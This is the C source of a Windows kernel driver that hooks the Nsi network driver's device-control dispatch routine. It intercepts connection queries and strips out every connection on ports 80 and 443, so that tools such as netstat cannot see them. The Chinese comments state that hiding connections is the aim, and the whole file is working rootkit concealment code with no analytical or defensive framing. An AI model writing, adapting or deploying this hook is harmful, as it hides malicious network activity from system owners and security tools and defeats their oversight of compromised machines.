#include"TCPHook.h"
#include <ntstrsafe.h>

#define CO_TL_ENTITY 0x400
#define CL_TL_ENTITY 0x401
#define IOCTL_NSI_QUERY 0x12001B
#define HTONS(a) (((0xFF&a)<<8) + ((0xFF00&a)>>8))
#define MY_MEMORY_TAG 'MyTg'

PCHAR GetIP(unsigned int ipAddr) {
	static char pIp[20];
	unsigned int nIpAddr = htonl(ipAddr);

	RtlStringCbPrintfA(pIp, sizeof(pIp), "%d.%d.%d.%d",
		(nIpAddr >> 24) & 0xFF,
		(nIpAddr >> 16) & 0xFF,
		(nIpAddr >> 8) & 0xFF,
		nIpAddr & 0xFF);

	return pIp;
}

NTSTATUS GetIPAndPort() {

	ULONG portValue = 0;
	CHAR szip[16] = { 0 };
	CHAR szport[16] = { 0 };

	if (g_InBuff != NULL) {

		CHAR* g_InBuffPtr = (CHAR*)g_InBuff;

		// 查找冒号分隔符的位置
		CHAR* colonPos = strchr(g_InBuffPtr, ':');
		if (colonPos == NULL) {
			DbgPrint("Invalid data format!\n");
			return STATUS_INVALID_PARAMETER;
		}

		// 计算 IP 地址的长度
		SIZE_T ipLength = colonPos - g_InBuffPtr;
		if (ipLength >= sizeof(szip)) {
			DbgPrint("IP address is too long!\n");
			return STATUS_INVALID_PARAMETER;
		}

		// 复制 IP 地址
		RtlCopyMemory(szip, g_InBuffPtr, ipLength);
		szip[ipLength] = '\0';

		// 复制端口号
		RtlCopyMemory(szport, colonPos + 1, sizeof(szport) - 1);
		szport[sizeof(szport) - 1] = '\0';

		NTSTATUS status = RtlCharToInteger(szport, 10, &portValue);
		if (!NT_SUCCESS(status)) {
			DbgPrint("Failed to convert szport to integer!\n");
			return STATUS_INVALID_PARAMETER;
		}
		RtlCopyMemory(g_szip, szip, sizeof(szip));
		g_portValue = portValue;

		DbgPrint("szip:%s,port:%d\n", g_szip, g_portValue);

	}
	return STATUS_SUCCESS;
}


NTSTATUS IoCompletionRoutine(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context) {
	PHOOK_IO_COMPLETION hookContext;
	PIO_COMPLETION_ROUTINE OriginalCompletion;
	PNET_INFO pNetInfo = NULL;

	hookContext = (PHOOK_IO_COMPLETION)Context;
	OriginalCompletion = hookContext->OriginalCompletion;

	PIO_STACK_LOCATION irpspNext = IoGetNextIrpStackLocation(Irp);

	if (!NT_SUCCESS(Irp->IoStatus.Status))
	{
		goto free_exit;
	}

#ifdef _WIN64
	if (IoIs32bitProcess(NULL))
	{
#endif
		PMIB_PARAMX32 pNsiParam = (PMIB_PARAMX32)Irp->UserBuffer;
		if (pNsiParam->NetInfoSize == sizeof(NET_INFO))
		{
			if (MmIsAddressValid(pNsiParam->NetInfo))
			{
				pNetInfo = (PNET_INFO)pNsiParam->NetInfo;

				for (ULONG i = 0; i < pNsiParam->ConnectCounts;)
				{
					// 这里默认隐藏80和443端口
					if (htons(pNetInfo[i].lPort) == 80 ||
						htons(pNetInfo[i].lPort) == 443 ||
						htons(pNetInfo[i].rPort) == 80 ||
						htons(pNetInfo[i].rPort) == 443)
					{
						if (i < pNsiParam->ConnectCounts - 1)
						{
							for (ULONG j = i; j < pNsiParam->ConnectCounts - 1; j++)
							{
								// 从此开始将后面的数据向前移动，覆盖当前位置的数据，达到隐藏目的
								RtlCopyMemory(&pNetInfo[j], &pNetInfo[j + 1], sizeof(NET_INFO));
							}
						}
						else
						{
							RtlZeroMemory(&pNetInfo[i], sizeof(NET_INFO));
						}
						// 记得将总的连接数减去1，因为已经隐藏了一个
						pNsiParam->ConnectCounts -= 1;
					}
					else
					{
						i++;
					}
				}
			}
		}
#ifdef _WIN64
	}
	else
	{
		PMIB_PARAMX64 pNsiParam = (PMIB_PARAMX64)Irp->UserBuffer;
		if (pNsiParam->NetInfoSize == sizeof(NET_INFO))
		{
			if (MmIsAddressValid(pNsiParam->NetInfo))
			{
				pNetInfo = (PNET_INFO)pNsiParam->NetInfo;

				for (ULONG i = 0; i < pNsiParam->ConnectCounts;)
				{
					// 这里默认隐藏80和443端口
					if (htons(pNetInfo[i].lPort) == 80 ||
						htons(pNetInfo[i].lPort) == 443 ||
						htons(pNetInfo[i].rPort) == 80 ||
						htons(pNetInfo[i].rPort) == 443)
					{
						if (i < pNsiParam->ConnectCounts - 1)
						{
							for (ULONG j = i; j < pNsiParam->ConnectCounts - 1; j++)
							{
								// 从此开始将后面的数据向前移动，覆盖当前位置的数据，达到隐藏目的
								RtlCopyMemory(&pNetInfo[j], &pNetInfo[j + 1], sizeof(NET_INFO));
							}
						}
						else
						{
							RtlZeroMemory(&pNetInfo[i], sizeof(NET_INFO));
						}
						// 记得将总的连接数减去1，因为已经隐藏了一个
						pNsiParam->ConnectCounts -= 1;
					}
					else
					{
						i++;
					}
				}
			}
		}
	}
#endif

free_exit:

	irpspNext->Context = hookContext->OriginalContext;
	irpspNext->CompletionRoutine = hookContext->OriginalCompletion;

	ExFreePoolWithTag(Context, MY_MEMORY_TAG);

	if (hookContext->bShouldInvolve)
	{
		return (OriginalCompletion)(DeviceObject, Irp, NULL);
	}
	else
	{
		if (Irp->PendingReturned) {
			IoMarkIrpPending(Irp);
		}
		return STATUS_SUCCESS;
	}

}


NTSTATUS HookDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {

	ULONG IoControlCode;
	PIO_STACK_LOCATION irpStack;

	irpStack = IoGetCurrentIrpStackLocation(pIrp);
	IoControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

	switch (irpStack->MajorFunction)
	{
	case IRP_MJ_DEVICE_CONTROL:
		
		if (IoControlCode == IOCTL_NSI_QUERY)
		{
			
			/*PCHAR pName = (PCHAR)PsGetProcessImageFileName(PsGetCurrentProcess());
			if (strstr(pName, "EnumNetPort"))
			{
				DbgBreakPoint();
			}*/

			PHOOK_IO_COMPLETION hookCompletion = NULL;
			hookCompletion = (PHOOK_IO_COMPLETION)ExAllocatePoolWithTag(NonPagedPool, sizeof(HOOK_IO_COMPLETION), MY_MEMORY_TAG);
			if (hookCompletion == NULL) {
				DbgPrint("ExAllocatePoolWithTag failed!");
				break;
			}
			RtlZeroMemory(hookCompletion, sizeof(HOOK_IO_COMPLETION));

			hookCompletion->OriginalCompletion = irpStack->CompletionRoutine;
			hookCompletion->OriginalContext = irpStack->Context;
			hookCompletion->pcb = PsGetCurrentProcess();
			hookCompletion->bShouldInvolve = (irpStack->Control & SL_INVOKE_ON_SUCCESS) ? TRUE : FALSE;

			irpStack->Control = 0;
			irpStack->Control |= SL_INVOKE_ON_SUCCESS;

			irpStack->Context = hookCompletion;
			irpStack->CompletionRoutine = (PIO_COMPLETION_ROUTINE)IoCompletionRoutine;
			
		}
		break;
	default:
		break;
	}

	return OldIrpMjDeviceControl(pDeviceObject, pIrp);
}


NTSTATUS InstallTCPHook()
{
	NTSTATUS ntStatus;
	UNICODE_STRING unDeviceTCP;
	WCHAR deviceTCPName[] = L"\\Device\\Nsi";
	pFile_tcp = NULL;
	pDev_tcp = NULL;
	pDrv_tcpip = NULL;


	RtlInitUnicodeString(&unDeviceTCP, deviceTCPName);
	ntStatus = IoGetDeviceObjectPointer(&unDeviceTCP, FILE_READ_ACCESS, &pFile_tcp, &pDev_tcp);
	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrint("IoGetDeviceObjectPointer failed!error:%d", ntStatus);
		return ntStatus;
	}
	pDrv_tcpip = pDev_tcp->DriverObject;

	OldIrpMjDeviceControl = pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL];
	if (OldIrpMjDeviceControl)
	{
		LONG64 deviceControlAdd;
		deviceControlAdd=InterlockedExchange64((PLONG64)(&pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL]), (LONG64)HookDeviceControl);
	}

	DbgPrint("Installed Nsi Hook Success!");

	return ntStatus;
}